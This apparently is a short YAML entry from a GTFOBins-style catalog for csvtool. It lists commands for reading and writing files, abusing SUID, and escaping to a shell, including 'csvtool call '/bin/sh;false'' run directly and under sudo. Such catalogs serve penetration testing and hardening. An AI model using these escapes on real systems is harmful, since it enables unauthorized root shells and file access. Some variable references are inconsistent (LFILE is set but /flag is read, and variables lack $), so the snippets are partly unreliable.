---
functions:
  file-read:
    - code: |
        LFILE=file-to-read.txt
        csvtool trim t /flag
  file-write:
    - code: |
        RFILE=file-to-read
        WFILE=file-to-write
        csvtool trim t RFILE -o WFILE
  suid:
    - code: |
        LFILE=file-to-read
        ./csvtool trim t LFILE
  shell:
    - code: csvtool call '/bin/sh;false' /etc/passwd
  sudo:
    - code: sudo csvtool call '/bin/sh;false' /etc/passwd
---
